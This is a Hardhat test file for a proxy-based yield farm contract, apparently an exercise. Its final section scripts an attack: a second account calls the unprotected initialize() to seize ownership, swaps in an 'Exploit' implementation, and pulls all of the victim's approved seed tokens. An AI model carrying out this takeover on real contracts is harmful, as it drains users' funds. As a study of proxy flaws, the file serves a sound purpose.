const { assert } = require("chai");
const { ethers } = require("hardhat");

describe("YieldFarm", function () {
  let seed, potato, proxy, yieldFarm, proxyAsFarm;
  let addr0;

  // order matters here since the yield farm has these values stored as constants
  // also the contracts should only be deployed once for that reason (no beforeEach!)
  before(async () => {
    [addr0] = await ethers.provider.listAccounts();

    const Seed = await ethers.getContractFactory("Seed");
    seed = await Seed.deploy();
    await seed.deployed();

    const YieldFarm = await ethers.getContractFactory("YieldFarm");
    yieldFarm = await YieldFarm.deploy();
    await yieldFarm.deployed();

    const Proxy = await ethers.getContractFactory("Proxy");
    proxy = await Proxy.deploy(yieldFarm.address);
    await proxy.deployed();

    const Potato = await ethers.getContractFactory("Potato");
    potato = await Potato.deploy(proxy.address);
    await potato.deployed();

    proxyAsFarm = await ethers.getContractAt("YieldFarm", proxy.address);
  });

  it("should have a balance of 10000 seed", async () => {
    const balance = await seed.balanceOf(addr0);
    assert.equal(balance.toString(), ethers.utils.parseEther("10000").toString());
  });

  describe("planting seeds", () => {
    const deposit = ethers.utils.parseEther("100");
    before(async () => {
      await seed.approve(proxyAsFarm.address, ethers.constants.MaxUint256);
      await proxyAsFarm.plant(deposit);
      await hre.network.provider.request({
        method: "evm_increaseTime",
        params: [60 * 60 * 24]
      });
    });

    it("should have a balance from the deposit", async () => {
      const balance = await seed.balanceOf(proxyAsFarm.address);
      assert.equal(balance.toString(), deposit.toString());
    });

    it("should allow harvesting potatoes", async () => {
      await proxyAsFarm.harvest();
      const balance = await potato.balanceOf(addr0);
      assert(balance.eq("8640000000000000000000"));
    });

    describe("taking control", () => {
      let signer1, addr1;
      before(async () => {
        signer1 = await ethers.provider.getSigner(1);
        addr1 = await signer1.getAddress();
        await proxyAsFarm.connect(signer1).initialize();
      });
      
      it("should set the new owner", async () => {
        assert.equal(await proxyAsFarm.owner(), addr1);
      });

      describe("pulling seeds", () => {
        before(async () => {
          const Exploit = await ethers.getContractFactory("Exploit");
          exploit = await Exploit.deploy();
          await exploit.deployed();
      
          await proxy.connect(signer1).changeImplementation(exploit.address);

          const proxyAsExploit = await ethers.getContractAt("Exploit", proxy.address);

          await proxyAsExploit.connect(signer1).transfer(addr1, ethers.utils.parseEther("100"));
          await proxyAsExploit.connect(signer1).pull(addr0, addr1, ethers.utils.parseEther("9900"));
        });

        it("should pull all the seeds to the signer", async () => {
          const balance = await seed.balanceOf(addr1);
          assert.equal(balance.toString(), ethers.utils.parseEther("10000").toString());
        });
      });
    });
  });
});
